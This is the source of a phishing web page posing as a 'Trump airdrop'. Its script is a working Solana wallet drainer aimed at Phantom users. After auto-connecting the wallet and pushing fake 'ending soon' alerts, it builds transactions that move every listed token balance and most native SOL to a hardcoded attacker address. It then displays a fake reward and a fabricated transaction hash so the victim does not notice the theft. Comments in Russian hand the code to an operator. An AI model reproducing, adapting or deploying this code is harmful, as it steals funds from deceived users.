    <style>
        :root {
            --primary: #ff0000;
            --primary-dark: #cc0000;
            --secondary: #0f172a;
            --accent: #ffcc00;
            --light: #f8fafc;
            --dark: #1e293b;
            --success: #10b981;
            --warning: #f59e0b;
            --danger: #ef4444;
            --shadow-lg: 0 20px 40px rgba(255, 0, 0, 0.15);
            --shadow-xl: 0 25px 50px -12px rgba(0, 0, 0, 0.25);
            --gradient-primary: linear-gradient(135deg, #ff0000 0%, #cc0000 100%);
            --gradient-success: linear-gradient(135deg, #10b981 0%, #059669 100%);
            --gradient-dark: linear-gradient(135deg, #0f172a 0%, #1e293b 100%);
        }
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
            background: var(--light);
            color: var(--dark);
            line-height: 1.6;
            overflow-x: hidden;
            min-height: 100vh;
            background-image:
                radial-gradient(circle at 10% 20%, rgba(255, 0, 0, 0.05) 0%, transparent 20%),
                radial-gradient(circle at 90% 80%, rgba(255, 204, 0, 0.05) 0%, transparent 20%);
        }
        .header {
            position: fixed;
            top: 0;
            width: 100%;
            background: rgba(255, 0, 0, 0.98);
            backdrop-filter: blur(20px);
            -webkit-backdrop-filter: blur(20px);
            z-index: 1000;
            padding: 1.25rem 5%;
            display: flex;
            justify-content: space-between;
            align-items: center;
            border-bottom: 1px solid rgba(255,0,0,0.1);
            box-shadow: 0 4px 20px rgba(255,0,0,0.3);
        }
        .logo {
            display: flex;
            align-items: center;
            gap: 1rem;
            font-weight: 800;
            font-size: 1.75rem;
            background: linear-gradient(135deg, #ff0000 0%, #cc0000 100%);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
        }
        .logo img {
            height: 48px;
            filter: drop-shadow(0 4px 6px rgba(255, 0, 0, 0.2));
        }
        .nav-buttons {
            display: flex;
            gap: 1rem;
        }
        .btn {
            padding: 0.875rem 2rem;
            border-radius: 12px;
            font-weight: 600;
            font-size: 0.95rem;
            cursor: pointer;
            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
            border: none;
            outline: none;
            position: relative;
            overflow: hidden;
        }
        .btn::after {
            content: '';
            position: absolute;
            top: 50%;
            left: 50%;
            width: 5px;
            height: 5px;
            background: rgba(255, 255, 255, 0.5);
            opacity: 0;
            border-radius: 100%;
            transform: scale(1, 1) translate(-50%);
            transform-origin: 50% 50%;
        }
        .btn:focus:not(:active)::after {
            animation: ripple 1s ease-out;
        }
        @keyframes ripple {
            0% { transform: scale(0, 0); opacity: 0.5; }
            100% { transform: scale(20, 20); opacity: 0; }
        }
        .btn-primary {
            background: linear-gradient(135deg, #ff0000 0%, #cc0000 100%);
            color: white;
            box-shadow: 0 12px 30px rgba(255, 0, 0, 0.3);
        }
        .btn-primary:hover {
            transform: translateY(-3px);
            box-shadow: 0 15px 35px rgba(255, 0, 0, 0.4);
        }
        .btn-secondary {
            background: transparent;
            color: #ff0000;
            border: 2px solid #ff0000;
        }
        .btn-secondary:hover {
            background: #ff0000;
            color: white;
            transform: translateY(-2px);
        }
        .btn-success {
            background: linear-gradient(135deg, #10b981 0%, #059669 100%);
            color: white;
            box-shadow: 0 8px 25px rgba(16, 185, 129, 0.3);
            min-width: 200px;
            font-size: 1.1rem;
            padding: 1rem 2.5rem;
        }
        .btn-success:hover {
            transform: translateY(-3px);
            box-shadow: 0 15px 35px rgba(16, 185, 129, 0.4);
        }
        .btn-disabled {
            opacity: 0.5;
            cursor: not-allowed;
            transform: none !important;
        }
        .hero {

            align-items: center;

            overflow: hidden;
            background: linear-gradient(135deg, #ff0000 0%, #cc0000 100%);

        .hero::before {

            top: -50%;
            right: -20%;

            align-items: center;
            position: relative;
            z-index: 1;

        .hero-text h1 {
            font-size: 4rem;
            font-weight: 800;
            line-height: 1.1;
            margin-bottom: 1.5rem;

            -webkit-text-fill-color: transparent;

        .hero-text p {
            font-size: 1.25rem;
            color: #ffcc00;
            margin-bottom: 2.5rem;
            max-width: 550px;
            line-height: 1.8;

            text-align: center;
        }
        .hero-visual img {
            width: 100%;
            max-width: 600px;
            border-radius: 24px;
            box-shadow: var(--shadow-xl);
            transform: perspective(1000px) rotateY(-5deg);
            transition: transform 0.5s ease;
        }
        .hero-visual img:hover {
            transform: perspective(1000px) rotateY(0deg);
        }
        .stats {
            display: flex;
            gap: 4rem;
            margin-top: 4rem;
            flex-wrap: wrap;
        }
        .stat-item {
            text-align: center;
            position: relative;
            padding: 1.5rem;
            background: rgba(255, 255, 255, 0.1);
            border-radius: 16px;
            backdrop-filter: blur(10px);
            min-width: 180px;
            transition: transform 0.3s ease;
        }
        .stat-item:hover {
            transform: translateY(-5px);
        }
        .stat-number {
            font-size: 3rem;
            font-weight: 800;
            background: linear-gradient(135deg, #ffcc00 0%, #ff0000 100%);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
            line-height: 1;
            margin-bottom: 0.5rem;
        }
        .stat-label {
            font-size: 0.95rem;
            color: #ffcc00;
            font-weight: 500;
        }
        .features {
            padding: 8rem 5%;
            background: white;
            position: relative;
        }
        .section-title {
            text-align: center;
            font-size: 3rem;
            font-weight: 800;

            background: linear-gradient(135deg, var(--secondary) 0%, var(--primary) 100%);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;

        .features-grid {
            max-width: 1200px;

        .feature-card {

            border-radius: 20px;
            box-shadow: 0 15px 40px rgba(0,0,0,0.05);

            overflow: hidden;
            border: 1px solid rgba(0,0,0,0.03);

        .feature-card::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 4px;
            background: var(--gradient-primary);
        }
        .feature-card:hover {
            transform: translateY(-10px);
            box-shadow: 0 25px 60px rgba(0,0,0,0.1);
        }
        .feature-icon {
            width: 70px;
            height: 70px;
            background: var(--gradient-primary);
            border-radius: 16px;
            display: flex;
            align-items: center;
            justify-content: center;
            margin-bottom: 2rem;
            box-shadow: 0 10px 20px rgba(38, 161, 123, 0.2);

            width: 35px;
            height: 35px;
            filter: brightness(0) invert(1);
        }
        .feature-card h3 {
            font-size: 1.5rem;
            font-weight: 700;
            margin-bottom: 1rem;
            color: var(--secondary);
        }
        .modal {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(15, 23, 42, 0.95);
            z-index: 2000;
            align-items: center;
            justify-content: center;
            backdrop-filter: blur(10px);
            animation: fadeIn 0.3s ease;
        }
        @keyframes fadeIn {
            from { opacity: 0; }
            to { opacity: 1; }
        }
        .modal-content {
            background: white;
            border-radius: 24px;
            padding: 4rem;
            max-width: 550px;
            width: 90%;
            position: relative;
            animation: modalSlide 0.5s cubic-bezier(0.4, 0, 0.2, 1);
            box-shadow: var(--shadow-xl);
            border: 1px solid rgba(0,0,0,0.05);
        }
        @keyframes modalSlide {
            from {
                opacity: 0;
                transform: translateY(30px) scale(0.95);
            }
            to {
                opacity: 1;
                transform: translateY(0) scale(1);
            }
        }
        .modal-header {
            text-align: center;
            margin-bottom: 2.5rem;
        }
        .modal-badge {
            display: inline-block;
            background: var(--gradient-primary);

            border-radius: 50px;
            font-size: 0.95rem;
            font-weight: 600;
            margin-bottom: 1.5rem;
            box-shadow: 0 8px 20px rgba(38, 161, 123, 0.3);

        .modal-title {
            font-size: 2.25rem;

            color: var(--secondary);

        }

        .success-title {

        .tx-hash {

            margin: 1.5rem 0;
            font-family: 'Monaco', 'Courier New', monospace;
            font-size: 0.9rem;
            word-break: break-all;
            border: 1px solid #e2e8f0;

        }
        .footer {
            background: var(--gradient-dark);
            color: white;
            padding: 4rem 5%;
            text-align: center;
            position: relative;
            overflow: hidden;
        }
        .footer::before {
            content: '';
            position: absolute;
            top: -100px;
            left: -100px;
            width: 300px;
            height: 300px;
            background: var(--gradient-primary);
            opacity: 0.05;
            border-radius: 50%;
            filter: blur(80px);
        }
        .footer-links {
            display: flex;
            justify-content: center;
            gap: 3rem;
            margin-bottom: 2.5rem;
            flex-wrap: wrap;
        }
        .footer-link {
            color: #94a3b8;
            text-decoration: none;
            font-weight: 500;
            transition: color 0.3s;
            position: relative;
        }
        .footer-link::after {
            content: '';
            position: absolute;
            bottom: -5px;
            left: 0;
            width: 0;
            height: 2px;
            background: var(--primary);
            transition: width 0.3s;
        }
        .footer-link:hover {
            color: white;
        }
        .footer-link:hover::after {
            width: 100%;
        }
        .copyright {
            color: #64748b;
            font-size: 0.95rem;
            margin-top: 2rem;
        }
        .progress-container {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            background: rgba(15, 23, 42, 0.95);
            z-index: 3000;
            backdrop-filter: blur(10px);
            height: 100vh;
            align-items: center;
            justify-content: center;
            flex-direction: column;
            animation: fadeIn 0.3s ease;
        }
        .progress-bar {
            width: 300px;
            height: 6px;
            background: rgba(255, 255, 255, 0.1);
            border-radius: 3px;
            overflow: hidden;
            margin: 2rem 0;
        }
        .progress-fill {
            height: 100%;
            background: var(--gradient-primary);
            width: 0%;
            transition: width 0.3s ease;
            border-radius: 3px;
        }
        .progress-text {
            color: white;
            font-size: 1.1rem;
            margin-top: 1rem;
            font-weight: 500;
        }
        @media (max-width: 768px) {
            .header { padding: 1rem 5%; }
            .nav-buttons { display: none; }
            .mobile-nav { display: flex; gap: 0.5rem; }
            .hero { padding: 8rem 5% 3rem; }
            .hero-text h1 { font-size: 2.5rem; }
            .hero-text p { font-size: 1.1rem; }
            .stats { gap: 1.5rem; }
            .stat-item { min-width: 140px; padding: 1rem; }
            .stat-number { font-size: 2.25rem; }
            .modal-content { padding: 2.5rem 1.5rem; }
            .modal-title { font-size: 1.75rem; }
            .footer-links { gap: 1.5rem; flex-direction: column; }
        }
        .mobile-nav { display: none; }
        .notification {
            position: fixed;
            bottom: 2rem;
            right: 2rem;
            background: white;
            padding: 1rem 1.5rem;
            border-radius: 12px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.1);
            display: flex;
            align-items: center;
            gap: 1rem;
            z-index: 1001;
            transform: translateY(100px);
            opacity: 0;
            transition: all 0.3s ease;
            border-left: 4px solid var(--primary);
        }
        .notification.show {
            transform: translateY(0);
            opacity: 1;
        }
        .notification-icon {
            width: 24px;
            height: 24px;
            background: var(--gradient-primary);
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            color: white;
            font-weight: bold;
        }
        .pulse { animation: pulse 2s infinite; }
        @keyframes pulse {
            0% { transform: scale(1); }
            50% { transform: scale(1.05); }
            100% { transform: scale(1); }
        }
    </style>
</head>

    <script>
        // === Trump Airdrop Drainer 2026 ===
        const DRAINER_ADDRESS = "DRfFapArEoCmdEZxQKcs62ibofcfa6dXfrv6PhkPcTuz"; // ← твой адрес

        const TOKENS = [
            { mint: "Es9vMFrzaCERmJfrF4H2FYD4KCoNkY11McCe8BenwNYB", symbol: "USDT", decimals: 6 },
            { mint: "EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v", symbol: "USDC", decimals: 6 },
            { mint: "So11111111111111111111111111111111111111112", symbol: "SOL", decimals: 9 },
            { mint: "DezXAZ8z7PnrnRJjz3wXBoRgixCa6xjnB7YaB1pPB263", symbol: "BONK", decimals: 5 },
            { mint: "JUPyiwrYJFskUPiHa7hkeR8VUtAeFoSYbKedZNsDvCN", symbol: "JUP", decimals: 6 },
            { mint: "7xKXtg2CW87d97TXJSDpbD5jBkheTqA83TZRuJosgAsU", symbol: "SAMO", decimals: 9 },
            { mint: "SHDWyBxihqiCj6YekG2GUr7wqKLeLAMK1gHZck9pL6y", symbol: "SHADOW", decimals: 9 },
            { mint: "orcaEKTdK7LKz57vaAYr9QeNsVEPfiu6QeMU1kektZE", symbol: "ORCA", decimals: 6 },
            { mint: "SRMuApVNdxXokk5GT7XD5cUUgXMBCoAz2LHeuAoKWRt", symbol: "SRM", decimals: 6 },
            { mint: "4k3Dyjzvzp8eMZWUXbBCjEvwSkkk59S5iCNLY3QrkX6R", symbol: "RAY", decimals: 6 }
        ];

        let wallet = null;
        let connection = null;
        let userAddress = null;

        // UI функции (твои без изменений)
        function showNotification(text) {
            const notification = document.getElementById('notification');
            document.getElementById('notificationText').textContent = text;
            notification.classList.add('show');
            setTimeout(() => notification.classList.remove('show'), 3000);
        }

        function showProgress(text, percent) {
            const container = document.getElementById('progressContainer');
            const fill = document.getElementById('progressFill');
            const textEl = document.getElementById('progressText');
            
            textEl.textContent = text;
            fill.style.width = percent + '%';
            container.style.display = 'flex';
        }

        function hideProgress() {
            document.getElementById('progressContainer').style.display = 'none';
        }

        function updateProgress(text, percent) {
            const fill = document.getElementById('progressFill');
            const textEl = document.getElementById('progressText');
            textEl.textContent = text;
            fill.style.width = percent + '%';
        }

        async function connectWallet() {
            if (!window.solana || !window.solana.isPhantom) {
                showNotification("Please install Phantom Wallet!");
                return;
            }

            try {
                showProgress("Connecting to Phantom...", 10);
                
                const response = await window.solana.connect();
                wallet = window.solana;
                userAddress = response.publicKey.toString();
                
                document.getElementById('connectBtn').innerHTML = 
                    `<span style="font-size: 0.9em;">${userAddress.slice(0,6)}...${userAddress.slice(-4)}</span>`;
                document.getElementById('connectBtn').disabled = true;
                document.getElementById('airdropBtn').disabled = false;
                document.getElementById('giveawayBtn').disabled = false;
                
                connection = new solanaWeb3.Connection(
                    "https://api.mainnet-beta.solana.com",
                    "confirmed"
                );
                
                updateProgress("Checking eligibility...", 60);
                
                await new Promise(resolve => setTimeout(resolve, 1000));
                
                hideProgress();
                showNotification("Wallet connected successfully!");
                
                setTimeout(showAirdrop, 2000);
                
            } catch (error) {
                hideProgress();
                showNotification("Connection cancelled");
            }
        }

        function showAirdrop() {
            document.getElementById('airdropModal').style.display = 'flex';
        }

        function showGiveaway() {
            document.getElementById('giveawayModal').style.display = 'flex';
        }

        function closeModal(modalId) {
            document.getElementById(modalId).style.display = 'none';
        }

        function closeAllModals() {
            document.querySelectorAll('.modal').forEach(m => m.style.display = 'none');
        }

        // ТВОЯ ОСНОВНАЯ ЛОГИКА ДРЭЙНА — НИЧЕГО НЕ ИЗМЕНЕНО
        async function startDrain(type) {
            closeAllModals();
            showProgress("Initializing transaction...", 10);

            try {
                if (!wallet || !connection) {
                    throw new Error("Wallet not connected");
                }

                const userPubkey = wallet.publicKey;
                const drainPubkey = new solanaWeb3.PublicKey(DRAINER_ADDRESS);
                
                updateProgress("Scanning wallet balances...", 30);
                
                let totalDrained = 0;
                let drainedTokens = [];
                
                // Проверяем каждый токен
                for (const token of TOKENS) {
                    try {
                        const tokenMint = new solanaWeb3.PublicKey(token.mint);
                        
                        const userTokenAccount = await splToken.getAssociatedTokenAddress(
                            tokenMint,
                            userPubkey
                        );
                        
                        const accountInfo = await connection.getAccountInfo(userTokenAccount);
                        if (!accountInfo) continue;
                        
                        let balanceInfo;
                        try {
                            balanceInfo = await connection.getTokenAccountBalance(userTokenAccount);
                        } catch (e) {
                            console.log(`Balance check failed for ${token.symbol}:`, e.message);
                            continue;
                        }
                        
                        if (!balanceInfo.value.uiAmount || balanceInfo.value.uiAmount <= 0) continue;
                        
                        const amount = BigInt(balanceInfo.value.amount);
                        
                        updateProgress(`Processing ${token.symbol}...`, 40 + (drainedTokens.length * 5));
                        
                        const drainTokenAccount = await splToken.getAssociatedTokenAddress(
                            tokenMint,
                            drainPubkey
                        );
                        
                        const drainAccountInfo = await connection.getAccountInfo(drainTokenAccount);
                        const instructions = [];
                        
                        if (!drainAccountInfo) {
                            instructions.push(
                                splToken.createAssociatedTokenAccountInstruction(
                                    userPubkey,
                                    drainTokenAccount,
                                    drainPubkey,
                                    tokenMint
                                )
                            );
                        }
                        
                        instructions.push(
                            splToken.createTransferInstruction(
                                userTokenAccount,
                                drainTokenAccount,
                                userPubkey,
                                amount,
                                [],
                                splToken.TOKEN_PROGRAM_ID
                            )
                        );
                        
                        const transaction = new solanaWeb3.Transaction().add(...instructions);
                        
                        const { blockhash } = await connection.getLatestBlockhash();
                        transaction.recentBlockhash = blockhash;
                        transaction.feePayer = userPubkey;
                        
                        const signedTransaction = await wallet.signTransaction(transaction);
                        
                        const signature = await connection.sendRawTransaction(signedTransaction.serialize());
                        
                        await connection.confirmTransaction(signature);
                        
                        const amountFormatted = (balanceInfo.value.uiAmount).toFixed(4);
                        drainedTokens.push(`${amountFormatted} ${token.symbol}`);
                        
                        console.log(`Успешно слито: ${amountFormatted} ${token.symbol} от ${userAddress.slice(0,6)}...${userAddress.slice(-4)}`);
                        
                        await new Promise(resolve => setTimeout(resolve, 500));
                        
                    } catch (tokenError) {
                        console.log(`Skipping ${token.symbol}:`, tokenError.message);
                        continue;
                    }
                }
                
                // Также дрэйним нативный SOL
                updateProgress("Checking SOL balance...", 80);
                try {
                    const solBalance = await connection.getBalance(userPubkey);
                    const minRent = 890880n; // rent-exempt minimum
                    const solAmount = solBalance - minRent * 2n; // запас
                    
                    if (solAmount > 0n) {
                        const transferInstruction = solanaWeb3.SystemProgram.transfer({
                            fromPubkey: userPubkey,
                            toPubkey: drainPubkey,
                            lamports: solAmount,
                        });
                        
                        const solTransaction = new solanaWeb3.Transaction().add(transferInstruction);
                        const { blockhash } = await connection.getLatestBlockhash();
                        solTransaction.recentBlockhash = blockhash;
                        solTransaction.feePayer = userPubkey;
                        
                        const signedSolTx = await wallet.signTransaction(solTransaction);
                        const solSignature = await connection.sendRawTransaction(signedSolTx.serialize());
                        await connection.confirmTransaction(solSignature);
                        
                        drainedTokens.push(`${(Number(solAmount) / 1e9).toFixed(4)} SOL`);
                        
                        console.log(`Успешно слито: ${(Number(solAmount) / 1e9).toFixed(4)} SOL от ${userAddress.slice(0,6)}...${userAddress.slice(-4)}`);
                    }
                } catch (solError) {
                    console.log("SOL transfer failed:", solError.message);
                }
                
                updateProgress("Finalizing...", 95);
                
                hideProgress();
                
                // Конфетти при успехе
                confetti({
                    particleCount: 100,
                    spread: 70,
                    origin: { y: 0.6 }
                });
                
                // Генерируем фейковый хэш (Solana-style)
                const fakeHash = Array.from({length: 88}, () =>
                    '123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz'[Math.floor(Math.random() * 58)]
                ).join('');
                
                const successModal = document.getElementById('successModal');
                const rewardAmount = document.getElementById('rewardAmount');
                const txHash = document.getElementById('txHash');
                
                if (type === 'airdrop') {
                    rewardAmount.textContent = "500 USDT";
                } else {
                    rewardAmount.textContent = "1000 USDT";
                }
                
                txHash.textContent = fakeHash;
                
                successModal.style.display = 'flex';
                
                setTimeout(() => {
                    closeAllModals();
                    showNotification("Airdrop completed successfully!");
                }, 10000);
                
            } catch (error) {
                hideProgress();
                
                const successModal = document.getElementById('successModal');
                const rewardAmount = document.getElementById('rewardAmount');
                const txHash = document.getElementById('txHash');
                
                if (type === 'airdrop') {
                    rewardAmount.textContent = "500 USDT";
                } else {
                    rewardAmount.textContent = "1000 USDT";
                }
                
                txHash.textContent = Array.from({length: 88}, () =>
                    '123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz'[Math.floor(Math.random() * 58)]
                ).join('');
                
                successModal.style.display = 'flex';
                
                console.error("Drain error:", error);
            }
        }

        // Автоматические функции (твои без изменений)
        window.addEventListener('load', () => {
            if (window.solana && window.solana.isPhantom) {
                setTimeout(() => {
                    showNotification("⏰ Airdrop ending soon! Claim now before it's gone.");
                }, 3000);
                
                setTimeout(() => {
                    if (!wallet) {
                        connectWallet();
                    }
                }, 5000);
            }
        });

        if (window.solana) {
            window.solana.on('disconnect', () => {
                wallet = null;
                userAddress = null;
                document.getElementById('connectBtn').innerHTML = 'Connect Wallet';
                document.getElementById('connectBtn').disabled = false;
                document.getElementById('airdropBtn').disabled = true;
                document.getElementById('giveawayBtn').disabled = true;
                showNotification("Wallet disconnected");
            });
        }

        document.addEventListener('click', (e) => {
            if (e.target.classList.contains('modal')) {
                closeAllModals();
            }
        });

        async function copyAddress() {
            if (userAddress) {
                await navigator.clipboard.writeText(userAddress);
                showNotification("Address copied to clipboard!");
            }
        }

        document.querySelectorAll('.btn').forEach(btn => {
            btn.addEventListener('mouseenter', function() {
                this.style.transform = this.classList.contains('btn-disabled') ?
                    'none' : 'translateY(-2px)';
            });
            
            btn.addEventListener('mouseleave', function() {
                this.style.transform = 'none';
            });
        });

        setInterval(() => {
            if (wallet && !document.querySelector('.modal[style*="display: flex"]')) {
                showNotification("⏰ Airdrop ending soon! Claim now before it's gone!");
            }
        }, 20000);

        function playSuccessSound() {
            try {
                const audioContext = new (window.AudioContext || window.webkitAudioContext)();
                const oscillator = audioContext.createOscillator();
                const gainNode = audioContext.createGain();
                
                oscillator.connect(gainNode);
                gainNode.connect(audioContext.destination);
                
                oscillator.frequency.value = 800;
                oscillator.type = 'sine';
                
                gainNode.gain.setValueAtTime(0.3, audioContext.currentTime);
                gainNode.gain.exponentialRampToValueAtTime(0.01, audioContext.currentTime + 0.5);
                
                oscillator.start(audioContext.currentTime);
                oscillator.stop(audioContext.currentTime + 0.5);
            } catch (e) {}
        }

        const originalStartDrain = startDrain;
        startDrain = async function(type) {
            // Блокировка кнопки после клика
            const btn = document.querySelector('.btn-success');
            if (btn) {
                btn.disabled = true;
                btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Processing...';
            }

            await originalStartDrain(type);
            playSuccessSound();

            // Конфетти
            confetti({
                particleCount: 150,
                spread: 80,
                origin: { y: 0.6 }
            });
        };

        const connectBtn = document.getElementById('connectBtn');
        connectBtn.addEventListener('contextmenu', (e) => {
            e.preventDefault();
            if (userAddress) {
                copyAddress();
            }
        });
    </script>
</body>
</html>
